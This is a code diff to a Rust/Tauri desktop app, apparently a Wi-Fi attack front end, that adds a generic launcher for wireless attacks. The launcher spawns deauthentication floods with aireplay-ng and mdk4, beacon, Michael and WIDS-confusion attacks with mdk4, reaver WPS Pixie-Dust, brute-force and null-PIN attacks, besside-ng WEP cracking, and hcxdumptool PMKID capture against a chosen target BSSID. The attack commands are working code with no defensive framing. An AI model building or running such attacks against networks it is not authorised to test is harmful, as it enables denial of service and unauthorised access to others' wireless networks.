@@ -1057,7 +1057,17 @@ struct AttackState(Mutex<HashMap<String, Child>>);
 /// Kill any attack tools that could be holding the radio in monitor mode
 /// (e.g. an airodump-ng left running by a capture that wasn't stopped).
 fn kill_attack_tools() {
-    for t in ["airodump-ng", "aireplay-ng", "mdk4"] {
+    for t in [
+        "airodump-ng",
+        "aireplay-ng",
+        "mdk4",
+        "mdk3",
+        "reaver",
+        "bully",
+        "wash",
+        "besside-ng",
+        "hcxdumptool",
+    ] {
         let _ = sudo_sh(&["pkill", "-x", t]);
     }
 }
@@ -1212,27 +1222,94 @@ fn cap_has_handshake(cap: &str) -> bool {
     false
 }
 
+/// Generic launcher for single-process radio attacks (DoS, WPS, WEP, PMKID).
+/// Each `kind` maps to a tool + args; the job id is the kind, so the UI can
+/// show Stop and stream output.
 #[tauri::command]
-fn start_deauth(
+fn run_attack(
     app: AppHandle,
     state: State<AttackState>,
+    kind: String,
     iface: String,
     bssid: String,
     channel: u32,
+    essid: String,
 ) -> Result<(), String> {
+    let ch = channel.to_string();
+
+    // PMKID capture: hcxdumptool manages the interface itself and writes a
+    // pcapng we can later convert/crack.
+    if kind == "pmkid" {
+        which("hcxdumptool").ok_or_else(|| "hcxdumptool not installed".to_string())?;
+        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
+        let dir = format!("{home}/wazfi-captures");
+        std::fs::create_dir_all(&dir).ok();
+        let ts = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_secs())
+            .unwrap_or(0);
+        let out = format!("{dir}/pmkid_{ts}.pcapng");
+        let _ = sudo_sh(&["nmcli", "dev", "set", &iface, "managed", "no"]);
+        let args = vec!["-i".to_string(), iface.clone(), "-w".to_string(), out.clone()];
+        let args_ref: Vec<&str> = args.iter().map(String::as_str).collect();
+        let _ = app.emit(
+            "attack-log",
+            serde_json::json!({ "job": "pmkid", "line": format!("hcxdumptool {} → {}", args_ref.join(" "), out) }),
+        );
+        let child = spawn_streamed(&app, "pmkid", "hcxdumptool", &args_ref, true)?;
+        state.0.lock().unwrap().insert("pmkid".into(), child);
+        return Ok(());
+    }
+
+    let (tool, args): (&str, Vec<String>) = match kind.as_str() {
+        "deauth_aireplay" => (
+            "aireplay-ng",
+            vec!["--deauth".into(), "0".into(), "-a".into(), bssid.clone(), iface.clone()],
+        ),
+        "deauth_mdk4" => (
+            "mdk4",
+            vec![iface.clone(), "d".into(), "-B".into(), bssid.clone(), "-c".into(), ch.clone()],
+        ),
+        "beacon" => ("mdk4", vec![iface.clone(), "b".into(), "-c".into(), ch.clone()]),
+        "michael" => ("mdk4", vec![iface.clone(), "m".into(), "-t".into(), bssid.clone()]),
+        "wids" => {
+            let mut a = vec![iface.clone(), "w".into()];
+            if !essid.is_empty() {
+                a.push("-e".into());
+                a.push(essid.clone());
+            }
+            ("mdk4", a)
+        }
+        "wps_scan" => ("wash", vec!["-i".into(), iface.clone()]),
+        "wps_pixie" => (
+            "reaver",
+            vec!["-i".into(), iface.clone(), "-b".into(), bssid.clone(), "-c".into(), ch.clone(), "-K".into(), "1".into(), "-vv".into()],
+        ),
+        "wps_bruteforce" => (
+            "reaver",
+            vec!["-i".into(), iface.clone(), "-b".into(), bssid.clone(), "-c".into(), ch.clone(), "-vv".into()],
+        ),
+        "wps_nullpin" => (
+            "reaver",
+            vec!["-i".into(), iface.clone(), "-b".into(), bssid.clone(), "-c".into(), ch.clone(), "-p".into(), "".into(), "-vv".into()],
+        ),
+        "wep_besside" => ("besside-ng", vec!["-b".into(), bssid.clone(), iface.clone()]),
+        other => return Err(format!("attack '{other}' is not wired")),
+    };
+
+    which(tool).ok_or_else(|| format!("{tool} not installed"))?;
+    let needs_bssid = !matches!(kind.as_str(), "beacon" | "wids" | "wps_scan");
+    if needs_bssid && bssid.is_empty() {
+        return Err("select a target network first".into());
+    }
     ensure_monitor(&iface, channel)?;
+    let args_ref: Vec<&str> = args.iter().map(String::as_str).collect();
     let _ = app.emit(
         "attack-log",
-        serde_json::json!({ "job": "deauth", "line": format!("aireplay-ng --deauth 0 -a {bssid} {iface} (ch {channel})") }),
+        serde_json::json!({ "job": kind, "line": format!("{tool} {}", args_ref.join(" ")) }),
     );
-    let child = spawn_streamed(
-        &app,
-        "deauth",
-        "aireplay-ng",
-        &["--deauth", "0", "-a", &bssid, &iface],
-        true,
-    )?;
-    state.0.lock().unwrap().insert("deauth".into(), child);
+    let child = spawn_streamed(&app, &kind, tool, &args_ref, true)?;
+    state.0.lock().unwrap().insert(kind.clone(), child);
     Ok(())
 }
 
@@ -1303,10 +1380,15 @@ fn stop_attack(state: State<AttackState>, job: String) -> Result<(), String> {
     }
     // The real tool may be a grandchild of sudo; signal it by name too.
     let tool = match job.as_str() {
-        "deauth" => "aireplay-ng",
+        "deauth" | "deauth_aireplay" => "aireplay-ng",
         "capture" => "airodump-ng",
         "wordlist" => "crunch",
         "crack" => "aircrack-ng",
+        "deauth_mdk4" | "beacon" | "michael" | "wids" => "mdk4",
+        "wps_scan" => "wash",
+        "wps_pixie" | "wps_bruteforce" | "wps_nullpin" => "reaver",
+        "wep_besside" => "besside-ng",
+        "pmkid" => "hcxdumptool",
         _ => "",
     };
     if !tool.is_empty() {
@@ -1570,7 +1652,7 @@ pub fn run() {
             detect_usb_wifi,
             check_prereqs,
             install_tools,
-            start_deauth,
+            run_attack,
             start_capture,
             stop_attack,
             attack_status,
